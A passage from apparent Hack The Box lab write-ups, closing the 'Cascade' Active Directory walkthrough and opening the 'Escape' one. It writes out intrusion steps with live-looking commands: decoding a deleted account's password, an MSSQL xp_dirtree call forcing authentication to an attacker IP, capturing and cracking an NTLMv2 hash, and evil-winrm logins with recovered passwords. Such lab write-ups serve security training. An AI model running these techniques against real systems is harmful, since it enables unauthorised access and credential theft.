           : 0\nCreated                         : 1/9/2020 7:30:19 PM\ncreateTimeStamp                 : 1/9/2020 7:30:19 PM\nDeleted                         : True\nDescription                     :\nDisplayName                     :\nDistinguishedName               : CN=CASC-WS1\\0ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN=Deleted Objects,DC=cascade,DC=local\ndSCorePropagationData           : {1/17/2020 3:37:36 AM, 1/17/2020 12:14:04 AM, 1/9/2020 7:30:19 PM, 1/1/1601 12:04:17 AM}\ninstanceType                    : 4\nisCriticalSystemObject          : False\nisDeleted                       : True\nLastKnownParent                 : OU=Computers,OU=UK,DC=cascade,DC=local\nlastLogoff                      : 0\nlastLogon                       : 0\nlocalPolicyFlags                : 0\nlogonCount                      : 0\nModified                        : 1/28/2020 6:08:35 PM\nmodifyTimeStamp                 : 1/28/2020 6:08:35 PM\nmsDS-LastKnownRDN               : CASC-WS1\nName                            : CASC-WS1\n                                  DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe\nnTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity\nObjectCategory                  :\nObjectClass                     : computer\nObjectGUID                      : 6d97daa4-2e82-4946-a11e-f91fa18bfabe\nobjectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1108\nprimaryGroupID                  : 515\nProtectedFromAccidentalDeletion : False\npwdLastSet                      : 132230718192147073\nsAMAccountName                  : CASC-WS1$\nsDRightsEffective               : 0\nuserAccountControl              : 4128\nuSNChanged                      : 245849\nuSNCreated                      : 24603\nwhenChanged                     : 1/28/2020 6:08:35 PM\nwhenCreated                     : 1/9/2020 7:30:19 PM\n\nCanonicalName                   : cascade.local/Deleted Objects/Scheduled Tasks\n                                  DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2\nCN                              : Scheduled Tasks\n                                  DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2\nCreated                         : 1/13/2020 5:21:53 PM\ncreateTimeStamp                 : 1/13/2020 5:21:53 PM\nDeleted                         : True\nDescription                     :\nDisplayName                     :\nDistinguishedName               : CN=Scheduled Tasks\\0ADEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2,CN=Deleted Objects,DC=cascade,DC=local\ndSCorePropagationData           : {1/17/2020 9:35:46 PM, 1/17/2020 9:32:57 PM, 1/17/2020 3:37:36 AM, 1/17/2020 12:14:04 AM...}\ngroupType                       : -2147483644\ninstanceType                    : 4\nisDeleted                       : True\nLastKnownParent                 : OU=Groups,OU=UK,DC=cascade,DC=local\nModified                        : 1/28/2020 6:07:55 PM\nmodifyTimeStamp                 : 1/28/2020 6:07:55 PM\nmsDS-LastKnownRDN               : Scheduled Tasks\nName                            : Scheduled Tasks\n                                  DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2\nnTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity\nObjectCategory                  :\nObjectClass                     : group\nObjectGUID                      : 13375728-5ddb-4137-b8b8-b9041d1d3fd2\nobjectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1131\nProtectedFromAccidentalDeletion : False\nsAMAccountName                  : Scheduled Tasks\nsDRightsEffective               : 0\nuSNChanged                      : 245848\nuSNCreated                      : 114790\nwhenChanged                     : 1/28/2020 6:07:55 PM\nwhenCreated                     : 1/13/2020 5:21:53 PM\n\nCanonicalName                   : cascade.local/Deleted Objects/{A403B701-A528-4685-A816-FDEE32BDDCBA}\n                                  DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e\nCN                              : {A403B701-A528-4685-A816-FDEE32BDDCBA}\n                                  DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e\nCreated                         : 1/26/2020 2:34:30 AM\ncreateTimeStamp                 : 1/26/2020 2:34:30 AM\nDeleted                         : True\nDescription                     :\nDisplayName                     : Block Potato\nDistinguishedName               : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local\ndSCorePropagationData           : {1/1/1601 12:00:00 AM}\nflags                           : 0\ngPCFileSysPath                  : \\\\cascade.local\\SysVol\\cascade.local\\Policies\\{A403B701-A528-4685-A816-FDEE32BDDCBA}\ngPCFunctionalityVersion         : 2\ngPCMachineExtensionNames        : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{53D6AB1D-2488-11D1-A28C-00C04FB94F17}][{B1BE8D72-6EAC-11D2-A4EA-00C04F79F83A}{53D6AB1D-2488-11D1-A28C-00C04FB94F17}]\ninstanceType                    : 4\nisDeleted                       : True\nLastKnownParent                 : CN=Policies,CN=System,DC=cascade,DC=local\nModified                        : 1/26/2020 2:40:52 AM\nmodifyTimeStamp                 : 1/26/2020 2:40:52 AM\nmsDS-LastKnownRDN               : {A403B701-A528-4685-A816-FDEE32BDDCBA}\nName                            : {A403B701-A528-4685-A816-FDEE32BDDCBA}\n                                  DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e\nnTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity\nObjectCategory                  :\nObjectClass                     : groupPolicyContainer\nObjectGUID                      : ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e\nProtectedFromAccidentalDeletion : False\nsDRightsEffective               : 0\nshowInAdvancedViewOnly          : True\nuSNChanged                      : 196701\nuSNCreated                      : 196688\nversionNumber                   : 2\nwhenChanged                     : 1/26/2020 2:40:52 AM\nwhenCreated                     : 1/26/2020 2:34:30 AM\n\nCanonicalName                   : cascade.local/Deleted Objects/Machine\n                                  DEL:93c23674-e411-400b-bb9f-c0340bda5a34\nCN                              : Machine\n                                  DEL:93c23674-e411-400b-bb9f-c0340bda5a34\nCreated                         : 1/26/2020 2:34:31 AM\ncreateTimeStamp                 : 1/26/2020 2:34:31 AM\nDeleted                         : True\nDescription                     :\nDisplayName                     :\nDistinguishedName               : CN=Machine\\0ADEL:93c23674-e411-400b-bb9f-c0340bda5a34,CN=Deleted Objects,DC=cascade,DC=local\ndSCorePropagationData           : {1/1/1601 12:00:00 AM}\ninstanceType                    : 4\nisDeleted                       : True\nLastKnownParent                 : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local\nModified                        : 1/26/2020 2:40:52 AM\nmodifyTimeStamp                 : 1/26/2020 2:40:52 AM\nmsDS-LastKnownRDN               : Machine\nName                            : Machine\n                                  DEL:93c23674-e411-400b-bb9f-c0340bda5a34\nnTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity\nObjectCategory                  :\nObjectClass                     : container\nObjectGUID                      : 93c23674-e411-400b-bb9f-c0340bda5a34\nProtectedFromAccidentalDeletion : False\nsDRightsEffective               : 0\nshowInAdvancedViewOnly          : True\nuSNChanged                      : 196699\nuSNCreated                      : 196689\nwhenChanged                     : 1/26/2020 2:40:52 AM\nwhenCreated                     : 1/26/2020 2:34:31 AM\n\nCanonicalName                   : cascade.local/Deleted Objects/User\n                                  DEL:746385f2-e3a0-4252-b83a-5a206da0ed88\nCN                              : User\n                                  DEL:746385f2-e3a0-4252-b83a-5a206da0ed88\nCreated                         : 1/26/2020 2:34:31 AM\ncreateTimeStamp                 : 1/26/2020 2:34:31 AM\nDeleted                         : True\nDescription                     :\nDisplayName                     :\nDistinguishedName               : CN=User\\0ADEL:746385f2-e3a0-4252-b83a-5a206da0ed88,CN=Deleted Objects,DC=cascade,DC=local\ndSCorePropagationData           : {1/1/1601 12:00:00 AM}\ninstanceType                    : 4\nisDeleted                       : True\nLastKnownParent                 : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local\nModified                        : 1/26/2020 2:40:52 AM\nmodifyTimeStamp                 : 1/26/2020 2:40:52 AM\nmsDS-LastKnownRDN               : User\nName                            : User\n                                  DEL:746385f2-e3a0-4252-b83a-5a206da0ed88\nnTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity\nObjectCategory                  :\nObjectClass                     : container\nObjectGUID                      : 746385f2-e3a0-4252-b83a-5a206da0ed88\nProtectedFromAccidentalDeletion : False\nsDRightsEffective               : 0\nshowInAdvancedViewOnly          : True\nuSNChanged                      : 196700\nuSNCreated                      : 196690\nwhenChanged                     : 1/26/2020 2:40:52 AM\nwhenCreated                     : 1/26/2020 2:34:31 AM\n\naccountExpires                  : 9223372036854775807\nbadPasswordTime                 : 0\nbadPwdCount                     : 0\nCanonicalName                   : cascade.local/Deleted Objects/TempAdmin\n                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059\ncascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz\nCN                              : TempAdmin\n                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059\ncodePage                        : 0\ncountryCode                     : 0\nCreated                         : 1/27/2020 3:23:08 AM\ncreateTimeStamp                 : 1/27/2020 3:23:08 AM\nDeleted                         : True\nDescription                     :\nDisplayName                     : TempAdmin\nDistinguishedName               : CN=TempAdmin\\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local\ndSCorePropagationData           : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM}\ngivenName                       : TempAdmin\ninstanceType                    : 4\nisDeleted                       : True\nLastKnownParent                 : OU=Users,OU=UK,DC=cascade,DC=local\nlastLogoff                      : 0\nlastLogon                       : 0\nlogonCount                      : 0\nModified                        : 1/27/2020 3:24:34 AM\nmodifyTimeStamp                 : 1/27/2020 3:24:34 AM\nmsDS-LastKnownRDN               : TempAdmin\nName                            : TempAdmin\n                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059\nnTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity\nObjectCategory                  :\nObjectClass                     : user\nObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059\nobjectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1136\nprimaryGroupID                  : 513\nProtectedFromAccidentalDeletion : False\npwdLastSet                      : 132245689883479503\nsAMAccountName                  : TempAdmin\nsDRightsEffective               : 0\nuserAccountControl              : 66048\nuserPrincipalName               : TempAdmin@cascade.local\nuSNChanged                      : 237705\nuSNCreated                      : 237695\nwhenChanged                     : 1/27/2020 3:24:34 AM\nwhenCreated                     : 1/27/2020 3:23:08 AM\n</code></pre> what i found inside is a password, for the TempAdmin (if you remember from above, we have seen this username before) <pre><code>CanonicalName                   : cascade.local/Deleted Objects/TempAdmin DEL:f0cc344d-31e0-4866-bceb-a842791ca059\ncascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz\n</code></pre> lets decode the password: <pre><code>echo \"YmFDVDNyMWFOMDBkbGVz\" | base64 -d  \nbaCT3r1aN00dles\n</code></pre> Great! we have a new pass, for TempAdmin.  We now have those creds: <pre><code>TempAdmin\nbaCT3r1aN00dles\n</code></pre></p> <p>But.. WAIT! the <code>Meeting_Notes_June_2018.html</code> file earlier told us that: <code>Username is TempAdmin (password is the same as the normal admin account password).</code></p> <p>So it actually gave away that <code>Administrator</code> has the same pass as <code>TempAdmin</code>! Ah the good old password reuse...</p> <p>lets try logging in then as <code>Administrator</code> to check if this is indeed true.</p>"},{"location":"ch3ckm8_HTB_Cascade/#logging-in-as-administrator","title":"Logging in as <code>Administrator</code>","text":"<p><pre><code>evil-winrm -i cascade.htb -u 'Administrator' -p 'baCT3r1aN00dles'\n</code></pre> and grabbed the root flag! <pre><code>0dafbc442394909a7f6ae72194593bc2\n</code></pre></p>"},{"location":"ch3ckm8_HTB_Cascade/#summary","title":"Summary","text":"<p>Here is the list of the steps simplified, per phase, for future reference and for quick reading:</p>"},{"location":"ch3ckm8_HTB_Cascade/#reconnaissance_1","title":"Reconnaissance","text":"<ol> <li>nmap scan -&gt; found multiple services to focus on, like RPC, SMB, LDAP </li> <li>RPC enumeration revealed domain users and groups</li> <li>SMB enumeration revealed domain users and groups too</li> <li>LDAP enumeration revealed base64 encrypted password for specific user (r.thompson), which was then decrypted to plaintext</li> </ol>"},{"location":"ch3ckm8_HTB_Cascade/#foothold_1","title":"Foothold","text":"<ol> <li>nxc usage revealed that found creds allowed access to SMB (user r.thompson)</li> <li>enumerated files and directories and found file with encrypted text, and a <code>hint</code> for later</li> <li>found it was related to VNC , and by searching the web found a way to decrypt it to plaintext pass</li> <li>nxc usage revealed that found creds allowed access to WIN-RM (user s.smith)</li> <li>grabbed user flag</li> </ol>"},{"location":"ch3ckm8_HTB_Cascade/#privesc_1","title":"Privesc","text":"<ol> <li>Group Membersip enumeration (user s.smith) reveled membership to <code>Audit Share</code> group</li> <li>Details for Audit Share group showed access to share containing multiple files</li> <li>These files contaned a database file, containing encrypted text, and also <code>.dll</code> and <code>.exe</code> files, with no obvious way of decrypting it, without more information.</li> <li>Debugging <code>.dll</code> and <code>.exe</code> gave away the encryption process and thus it was then reversed</li> <li>The decrypted text was password for another user (ArkSvc)</li> <li>Group Membersip enumeration (user ArkSvc) reveled membership to <code>AD Recycle Bin</code> group</li> <li>retrieved deleted objects</li> <li>those deleted objects contained base64 encrypted pass, which by decryption showed plaintext pass for a user (TempAdmin) that we had a <code>hint</code> earlier on in the foothold stage</li> <li>password reuse was indicated by the <code>hint</code> from the foothold stage, for the <code>Administrator</code></li> <li>grabbed root flag</li> </ol>"},{"location":"ch3ckm8_HTB_Cascade/#sidenotes","title":"Sidenotes","text":"<p>Overall, the steps for achieving foothold were kinda easy and doable, the privesc part though required debugging and understanding the functionality of an app, and specifically it's encryption process. After the debugging part, the road to Administrator was protected by deleted objects in the recycle bin, as indicated by the latest compromised user's group membership.  This machine deserves a place in my notes mostly for the recon phase, the enumeration through all stages, and for the recycle bin part. </p> <p></p> <p>You can also watch the whole process recorded (apart from the .dll and .exe debugging part) here: https://asciinema.org/a/lSU3r4wlR1L3bOrPhxrKXjngp</p>"},{"location":"ch3ckm8_HTB_Escape/","title":"Escape","text":""},{"location":"ch3ckm8_HTB_Escape/#intro","title":"Intro","text":"<p>[[windows]] [[NotAssumedBreach]] [[mssql]] [[certificates]] [[certvulntoESC1]]</p> <p>Tags: #windows #NotAssumedBreach #mssql #certificates #certvulntoESC1</p> <p>Tools used:</p> <ul> <li>rpcclient (RPC enumeration)</li> <li>smbclient (SMB enumeration)</li> <li>ldapsearch (LDAP enumeration)</li> <li>mssqlclient (MSSQL enumeration, impacket)</li> <li>Responder (capturing the NTLM hash)</li> <li>certipy (ADCS abuse)</li> </ul>"},{"location":"ch3ckm8_HTB_Escape/#reconnaissance","title":"Reconnaissance","text":""},{"location":"ch3ckm8_HTB_Escape/#add-target-to-etchosts","title":"Add target to /etc/hosts","text":"<pre><code>sudo sh -c \"echo '10.129.228.253 Escape.htb' &gt;&gt; /etc/hosts\"\n</code></pre>"},{"location":"ch3ckm8_HTB_Escape/#nmap-scan","title":"Nmap scan","text":"<pre><code>sudo nmap -sC -sV Escape.htb\n</code></pre> <pre><code>Starting Nmap 7.94SVN ( &lt;https://nmap.org&gt; ) at 2025-08-17 09:18 CDT\nNmap scan report for Escape.htb (10.129.228.253)\nHost is up (0.0074s latency).\nNot shown: 988 filtered tcp ports (no-response)\nPORT     STATE SERVICE       VERSION\n53/tcp   open  domain        Simple DNS Plus\n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-17 22:18:28Z)\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject:\n| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel\n| Not valid before: 2024-01-18T23:03:57\n|_Not valid after:  2074-01-05T23:03:57\n|_ssl-date: 2025-08-17T22:19:49+00:00; +8h00m01s from scanner time.\n445/tcp  open  microsoft-ds?\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)\n|_ssl-date: 2025-08-17T22:19:48+00:00; +8h00m00s from scanner time.\n| ssl-cert: Subject:\n| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel\n| Not valid before: 2024-01-18T23:03:57\n|_Not valid after:  2074-01-05T23:03:57\n1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM\n| ms-sql-ntlm-info:\n|   10.129.228.253:1433:\n|     Target_Name: sequel\n|     NetBIOS_Domain_Name: sequel\n|     NetBIOS_Computer_Name: DC\n|     DNS_Domain_Name: sequel.htb\n|     DNS_Computer_Name: dc.sequel.htb\n|     DNS_Tree_Name: sequel.htb\n|_    Product_Version: 10.0.17763\n| ms-sql-info:\n|   10.129.228.253:1433:\n|     Version:\n|       name: Microsoft SQL Server 2019 RTM\n|       number: 15.00.2000.00\n|       Product: Microsoft SQL Server 2019\n|       Service pack level: RTM\n|       Post-SP patches applied: false\n|_    TCP port: 1433\n|_ssl-date: 2025-08-17T22:19:49+00:00; +8h00m01s from scanner time.\n| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback\n| Not valid before: 2025-08-17T22:11:38\n|_Not valid after:  2055-08-17T22:11:38\n3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)\n|_ssl-date: 2025-08-17T22:19:49+00:00; +8h00m01s from scanner time.\n| ssl-cert: Subject:\n| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel\n| Not valid before: 2024-01-18T23:03:57\n|_Not valid after:  2074-01-05T23:03:57\n3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)\n|_ssl-date: 2025-08-17T22:19:48+00:00; +8h00m00s from scanner time.\n| ssl-cert: Subject:\n| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel\n| Not valid before: 2024-01-18T23:03:57\n|_Not valid after:  2074-01-05T23:03:57\nService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: 8h00m00s, deviation: 0s, median: 7h59m59s\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n| smb2-time:\n|   date: 2025-08-17T22:19:11\n|_  start_date: N/A\n\nService detection performed. Please report any incorrect results at &lt;https://nmap.org/submit/&gt; .\nNmap done: 1 IP address (1 host up) scanned in 93.92 seconds\n</code></pre> <p>The host appears to be a DC, add this also on etc hosts: Subject Alternative Name: DNS: <code>dc.sequel.htb</code> and also change it to match to domain accordingly:</p> <pre><code>10.129.228.253 dc.sequel.htb sequel.htb\n</code></pre>"},{"location":"ch3ckm8_HTB_Escape/#rpc-enumeration","title":"RPC enumeration","text":""},{"location":"ch3ckm8_HTB_Escape/#anonymous-logon","title":"Anonymous logon","text":"<pre><code>rpcclient -U \"\" -N sequel.htb\n</code></pre> <p>tried running some commands but got access denied:</p> <pre><code>\u2514\u2500\u2500\u257c [\u2605]$ rpcclient -U \"\" -N sequel\\.htb\nrpcclient $&gt; enumdomusers\nresult was NT_STATUS_ACCESS_DENIED\nrpcclient $&gt; enumdomains\nresult was NT_STATUS_ACCESS_DENIED\nrpcclient $&gt; \n</code></pre>"},{"location":"ch3ckm8_HTB_Escape/#smb-enumeration","title":"SMB enumeration","text":""},{"location":"ch3ckm8_HTB_Escape/#anonymous-logon_1","title":"Anonymous logon","text":"<pre><code>smbclient -N -L sequel.htb\n</code></pre> <pre><code>Sharename       Type      Comment\n---------       ----      -------\nADMIN$          Disk      Remote Admin\nC$              Disk      Default share\nIPC$            IPC       Remote IPC\nNETLOGON        Disk      Logon server share \nPublic          Disk      \nSYSVOL          Disk      Logon server share\n</code></pre> <p>hm i saw here the share <code>Public</code> which is not a default one, we could inspect it further:</p> <pre><code>smbclient //sequel.htb/Public\n</code></pre> <pre><code>smb: \\&gt; ls\n  .                                   D        0  Sat Nov 19 05:51:25 2022\n  ..                                  D        0  Sat Nov 19 05:51:25 2022\n  SQL Server Procedures.pdf           A    49551  Fri Nov 18 07:39:43 202\n</code></pre> <p>Interesting, lets download it:</p> <pre><code>smb: \\&gt; get SQL Server Procedures.pdf \nNT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \\SQL\nsmb: \\&gt; get \"SQL Server Procedures.pdf\"\ngetting file \\SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (1512.2 KiloBytes/sec) (average 1512.2 KiloBytes/sec)\n</code></pre> <p>(here you must use double quotes to download this file, since the filename contains spaces)</p> <p>Next, i viewed the pdf: <code>SQL Server Procedures.pdf</code></p> <p>1st page:</p> <p></p> <p>2nd page:</p> <p></p> <ul> <li>For the <code>domain joined</code> machines, the SQL Management Studio link is</li> </ul> <p>https://learn.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms?view=sql-server-ver16</p> <ul> <li>For the <code>non domain joined</code> machines, the command inside the pdf is:</li> </ul> <pre><code>cmdkey /add:\"&lt;serverName&gt;.sequel.htb\" /user:\"sequel\\&lt;userame&gt;\" /pass:&lt;password&gt;\n</code></pre> <ul> <li>Also, Brandon\u2019s mail here is: <code>brandon.brown@sequel.htb</code></li> <li>Lastly, we are given creds:</li> </ul> <pre><code>PublicUser\nGuestUserCantWrite1\n</code></pre> <p>So in the contents of the pdf file give out important information. The first hint we are given, is that it has to do with SQL, and specifically an SQL Server. </p> <p>Later on, the pdf informs us that machines out of the domain can connect in a different way, using cmdkey command instead of installing the SQL Management Studio.</p> <p>Furthermoe, since we are give creds, we could check whether we can login somewhere with them first:</p>"},{"location":"ch3ckm8_HTB_Escape/#checking-where-we-can-login-with-the-given-creds","title":"Checking where we can login with the given creds","text":"<p>Lets now use my script to bulk check the services to which we can login with those creds: ch3ckkm8/auto_netexec: Automating netexec to bulk check all available services, given the target and the creds to check</p> <pre><code>./auto_netexec_bulk_creds_checker.sh sequel.htb 'PublicUser' 'GuestUserCantWrite1'\n</code></pre> <pre><code>[*] Checking if winrm port 5985 is open on sequel.htb...\n[+] Port 5985 open \u2014 checking winrm with netexec\nWINRM       10.129.228.253  5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)\nWINRM       10.129.228.253  5985   DC               [-] sequel.htb\\PublicUser:GuestUserCantWrite1\n\n[*] Checking if smb port 445 is open on sequel.htb...\n[+] Port 445 open \u2014 checking smb with netexec\nSMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)\nSMB         10.129.228.253  445    DC               [+] sequel.htb\\PublicUser:GuestUserCantWrite1 \n\n[*] Checking if ldap port 389 is open on sequel.htb...\n[+] Port 389 open \u2014 checking ldap with netexec\nSMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)\nLDAPS       10.129.228.253  636    DC               [-] Error in searchRequest -&gt; operationsError: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4563\nLDAPS       10.129.228.253  636    DC               [+] sequel.htb\\PublicUser:GuestUserCantWrite1 \n\n[*] Checking if rdp port 3389 is open on sequel.htb...\n[-] Skipping rdp \u2014 port 3389 is closed\n\n[*] Checking if wmi port 135 is open on sequel.htb...\n[+] Port 135 open \u2014 checking wmi with netexec\nRPC         10.129.228.253  135    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)\nRPC         10.129.228.253  135    DC               [-] sequel.htb\\PublicUser:GuestUserCantWrite1 (RPC_S_SEC_PKG_ERROR)\n\n[*] Checking if nfs port 2049 is open on sequel.htb...\n[-] Skipping nfs \u2014 port 2049 is closed\n\n[*] Checking if ssh port 22 is open on sequel.htb...\n[-] Skipping ssh \u2014 port 22 is closed\n\n[*] Checking if vnc port 5900 is open on sequel.htb...\n[-] Skipping vnc \u2014 port 5900 is closed\n\n[*] Checking if ftp port 21 is open on sequel.htb...\n[-] Skipping ftp \u2014 port 21 is closed\n\n[*] Checking if mssql port 1433 is open on sequel.htb...\n[+] Port 1433 open \u2014 checking mssql with netexec\n[*] Testing MSSQL with domain/Windows auth...\nMSSQL       10.129.228.253  1433   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)\nMSSQL       10.129.228.253  1433   DC               [-] sequel.htb\\PublicUser:GuestUserCantWrite1 (Login failed for user 'sequel\\Guest'. Please try again with or without '--local-auth')\n[*] Testing MSSQL with local SQL auth...\nMSSQL       10.129.228.253  1433   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)\nMSSQL       10.129.228.253  1433   DC               [+] DC\\PublicUser:GuestUserCantWrite1\n</code></pre> <p>According to the output here, we can login towards <code>LDAP</code>,<code>SMB</code> and <code>MSSQL</code> services, lets enumerate them with those creds:</p>"},{"location":"ch3ckm8_HTB_Escape/#ldap-enumeration-as-publicuser","title":"LDAP enumeration as PublicUser","text":"<pre><code>ldapsearch -LLL -x -H ldap://sequel.htb -s base namingcontexts \n</code></pre> <pre><code>dn:\nnamingcontexts: DC=sequel,DC=htb\nnamingcontexts: CN=Configuration,DC=sequel,DC=htb\nnamingcontexts: CN=Schema,CN=Configuration,DC=sequel,DC=htb\nnamingcontexts: DC=DomainDnsZones,DC=sequel,DC=htb\nnamingcontexts: DC=ForestDnsZones,DC=sequel,DC=htb\n</code></pre> <p>tried anonymous , not successful:</p> <pre><code>ldapsearch -LLL -x -H ldap://sequel.htb -b \"DC=sequel,DC=htb\"\n</code></pre>"},{"location":"ch3ckm8_HTB_Escape/#smb-enumeration-as-publicuser","title":"SMB enumeration as PublicUser","text":"<pre><code>nxc smb sequel.htb  -u 'PublicUser' -p 'GuestUserCantWrite1 ' --shares\nsmbmap -H sequel.htb -d sequel.htb -u PublicUser-p GuestUserCantWrite1\n</code></pre> <p>All of these failed\u2026. hm what now, we tried <code>LDAP</code> <code>SMB</code> and no luck.</p> <p>Lets move on and to investigate <code>MSSQL</code> :</p>"},{"location":"ch3ckm8_HTB_Escape/#mssql-enumeration-as-publicuser","title":"MSSQL enumeration as PublicUser","text":"<pre><code>mssqlclient.py sequel.htb/PublicUser:GuestUserCantWrite1@dc.sequel.htb\n</code></pre> <p>login was successful! , lets move on now and try to inspect the databases inside:</p> <pre><code>SQL (PublicUser  guest@master)&gt; select name from master..sysdatabases;\n\nname     \n------   \nmaster   \ntempdb   \nmodel    \nmsdb  \n</code></pre> <p>After some research, i found that these 4 databases are default databases on MSSQL\u2026. so navigating their schemas and values wont provide anything usefull.</p>"},{"location":"ch3ckm8_HTB_Escape/#foothold","title":"Foothold","text":"<p>But what to do next??? Can we do sth more in MSSQL besides viewing database contents?</p> <p>i did some research, tried multiple things from here: https://hacktricks.xsx.tw/network-services-pentesting/pentesting-mssql-microsoft-sql-server</p> <p>but the only one that appeared to work was the <code>NetNTLM</code> part:</p> <p>remotely, on the MSSQL shell run this with your attacker ip:</p> <pre><code>EXEC xp_dirtree '\\\\10.10.14.96\\share', 1, 1\n</code></pre> <p>and on your host, start responder:</p> <pre><code>sudo python3 Responder.py -I tun0\n</code></pre> <p>aand we got the ntlm hash of <code>sql_svc</code> user!</p> <pre><code>[+] Listening for events...\n\n[SMB] NTLMv2-SSP Client   : 10.129.228.253\n[SMB] NTLMv2-SSP Username : sequel\\sql_svc\n[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:031325f9a83e80fbn</code></pre> <p>Now that we have the hash, lets attempt to crack it:</p> <pre><code>hashcat sql_svc_netntmlv2 /usr/share/wordlists/rockyou.txt\n</code></pre> <p>the crack was successful, and the password is <code>REGGIE1234ronnie</code>, we can now try to login via win-rm:</p> <pre><code>evil-winrm -i sequel.htb -u sql_svc -p REGGIE1234ronnie\n</code></pre> <p>and we are in:</p> <p></p> <p>whats next? i checked the desktop and there was no flag there. </p>"},{"location":"ch3ckm8_HTB_Escape/#directories-and-files-enumeration-as-sql_svc","title":"Directories and Files enumeration as sql_svc","text":"<p>We could do some enumeration here, such as inspecting the Users:</p> <pre><code>Mode                LastWriteTime         Length Name\n----                -------------         ------ ----\nd-----         2/7/2023   8:58 AM                Administrator\nd-r---        7/20/2021  12:23 PM                Public\nd-----         2/1/2023   6:37 PM                Ryan.Cooper\nd-----         2/7/2023   8:10 AM                sql_svc\n</code></pre> <p>tried navigating to <code>Public</code> and <code>Ryan.Cooper</code> but access was denied, lets move backwards towards the C drive to get a better picture of the overall file structure:</p> <pre><code>Directory: C:\\\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\nd-----         2/1/2023   8:15 PM                PerfLogs\nd-r---         2/6/2023  12:08 PM                Program Files\nd-----       11/19/2022   3:51 AM                Program Files (x86)\nd-----       11/19/2022   3:51 AM                Public\nd-----         2/1/2023   1:02 PM                SQLServer\nd-r---         2/1/2023   1:55 PM                Users\nd-----         2/6/2023   7:21 AM                Window\n</code></pre> <p>Here are goal is to search for non default folders first. In this case, <code>Public</code> and <code>SQLServer</code> to me does not seem like default windows folders, so lets search those 2 first:</p> <p><code>Public</code> folder:</p> <pre><code>Directory: C:\\Public\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\n-a----       11/18/2022   5:39 AM          49551 SQL Server Procedures.pdf\n</code></pre> <p>Contains the pdf we found via smb earlier on the recon stage</p> <p><code>SQLServer</code> folder:</p> <pre><code>Directory: 